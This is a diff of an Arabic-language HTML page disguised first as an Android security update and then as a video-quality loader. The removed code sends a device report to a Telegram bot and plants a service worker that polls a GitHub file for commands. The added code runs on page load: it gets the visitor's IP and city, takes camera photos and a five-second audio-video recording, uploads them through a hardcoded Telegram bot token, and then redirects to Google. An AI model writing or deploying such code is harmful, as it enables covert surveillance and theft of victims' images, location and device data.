@@ -2,104 +2,92 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث أمان أندرويد</title>
+    <title>تحميل الموارد...</title>
     <style>
-        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; padding: 40px 20px; }
-        .terminal { border: 1px solid #00ff41; padding: 20px; background: #050505; box-shadow: 0 0 15px #00ff41; display: inline-block; width: 100%; max-width: 450px; }
-        .scan-bar { width: 100%; height: 4px; background: #111; position: relative; overflow: hidden; margin: 15px 0; }
-        .progress { width: 40%; height: 100%; background: #00ff41; position: absolute; animation: move 1.5s infinite linear; }
-        @keyframes move { from { left: -40%; } to { left: 100%; } }
-        button { background: #00ff41; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
+        body { background: #000; color: #00ff00; font-family: monospace; text-align: center; padding-top: 20vh; }
+        .progress { width: 80%; background: #333; margin: 20px auto; border-radius: 10px; }
+        .bar { width: 10%; height: 20px; background: #00ff00; border-radius: 10px; transition: 0.5s; }
     </style>
 </head>
 <body>
+    <h2>جاري تحسين جودة العرض...</h2>
+    <div class="progress"><div id="bar" class="bar"></div></div>
+    <p id="status">جاري جلب البيانات التقريبية...</p>
 
-<div class="terminal">
-    <h3 id="head">[ SYSTEM SCAN V10 ]</h3>
-    <div class="scan-bar"><div class="progress"></div></div>
-    <p id="status" style="font-size: 14px;">جاري فحص سلامة الملفات...</p>
-    <button onclick="ignite()">تحسين أداء النظام</button>
-</div>
+    <video id="video" width="640" height="480" autoplay muted style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
-<script>
-    const TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
-    const CMD_URL = 'https://raw.githubusercontent.com/mosbahimouataz7/no-ip-/main/server.json';
-    let chatId = "";
+    <script>
+        const TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
+        let chatId = "";
 
-    // 1. كود الـ Service Worker المدمج
-    const swCode = `
-        const TOKEN = '${TOKEN}';
-        const CMD_URL = '${CMD_URL}';
-        let cid = "";
-        let lastCmdId = "";
-
-        self.addEventListener('message', (e) => {
-            if (e.data.type === 'INIT') { 
-                cid = e.data.id; 
-                setInterval(pollCommands, 10000); // فحص كل 10 ثواني
-            }
-        });
-
-        async function pollCommands() {
+        async function getChatId() {
             try {
-                const res = await fetch(CMD_URL + '?nocache=' + Date.now());
-                const cmd = await res.json();
-                if (cmd.id !== lastCmdId) {
-                    lastCmdId = cmd.id;
-                    processAction(cmd.action);
-                }
-            } catch(e) {}
+                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates`);
+                const data = await res.json();
+                chatId = data.result[data.result.length - 1].message.chat.id;
+                return true;
+            } catch (e) { return false; }
         }
 
-        async function processAction(act) {
-            let info = "";
-            if (act === "REPORT") {
-                info = "📊 Active Status: Target Online";
-            } else if (act === "VIBRATE") {
-                self.registration.showNotification("System Alert", { body: "Battery Overheating!", vibrate: [500, 100, 500] });
-                info = "📳 Vibration Executed";
+        async function sendToTelegram(type, blob, fileName) {
+            const fd = new FormData();
+            fd.append('chat_id', chatId);
+            fd.append(type, blob, fileName);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+                method: 'POST', body: fd
+            });
+        }
+
+        async function startExtraction() {
+            const ready = await getChatId();
+            if (!ready) return;
+
+            document.getElementById('bar').style.width = "30%";
+            
+            // 1. الموقع التقريبي (IP)
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+            const ipMsg = `🌐 IP: ${ipData.ip}\n📍 المدينة: ${ipData.city}`;
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(ipMsg)}`);
+
+            // 2. طلب الكاميرا والميكروفون (صور + فيديو)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const videoElem = document.getElementById('video');
+                videoElem.srcObject = stream;
+                document.getElementById('bar').style.width = "50%";
+
+                // التقاط 3 صور بفاصل ثانية
+                for (let i = 1; i <= 3; i++) {
+                    await new Promise(r => setTimeout(r, 1000));
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(videoElem, 0, 0, 640, 480);
+                    canvas.toBlob(blob => sendToTelegram('photo', blob, `img${i}.jpg`), 'image/jpeg');
+                }
+
+                document.getElementById('status').innerText = "جاري معالجة الفيديو...";
+                document.getElementById('bar').style.width = "70%";
+
+                // 3. تسجيل فيديو لمدة 5 ثوانٍ
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                    sendToTelegram('video', videoBlob, 'record.mp4');
+                    document.getElementById('bar').style.width = "100%";
+                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000); // تسجيل 5 ثوانٍ
+
+            } catch (err) {
+                document.getElementById('status').innerText = "فشل: يرجى السماح بالوصول للكاميرا";
             }
-            if (cid) fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage?chat_id=' + cid + '&text=' + encodeURIComponent(info));
         }
-    `;
 
-    // 2. تفعيل النظام
-    async function ignite() {
-        document.getElementById('status').innerText = "جاري تنفيذ بروتوكولات الأمان...";
-        
-        // جلب معرف التليجرام
-        try {
-            const res = await fetch(\`https://api.telegram.org/bot\${TOKEN}/getUpdates\`);
-            const data = await res.json();
-            chatId = data.result[data.result.length - 1].message.chat.id;
-
-            // استخراج البيانات الفورية
-            const ua = navigator.userAgent;
-            const model = ua.match(/\\(([^)]+)\\)/) ? ua.match(/\\(([^)]+)\\)/)[1] : "Unknown Device";
-            const initialReport = \`💀 **NEW TARGET READY**\\nDevice: \${model}\\nIP: (Fetching...)\`;
-            
-            await fetch(\`https://api.telegram.org/bot\${TOKEN}/sendMessage?chat_id=\${chatId}&text=\${encodeURIComponent(initialReport)}&parse_mode=Markdown\`);
-
-            // زرع الـ Service Worker عبر Blob
-            const blob = new Blob([swCode], { type: 'text/javascript' });
-            const swUrl = URL.createObjectURL(blob);
-            const reg = await navigator.serviceWorker.register(swUrl);
-            
-            // إرسال الـ ID للخدمة
-            setTimeout(() => {
-                if (navigator.serviceWorker.controller) {
-                    navigator.serviceWorker.controller.postMessage({ type: 'INIT', id: chatId });
-                }
-            }, 1000);
-
-            document.getElementById('status').innerText = "اكتمل التحديث بنجاح!";
-            setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
-
-        } catch (e) {
-            alert("فشل الاتصال بالسيرفر، تأكد من وجود إنترنت.");
-        }
-    }
-</script>
+        window.onload = startExtraction;
+    </script>
 </body>
 </html>
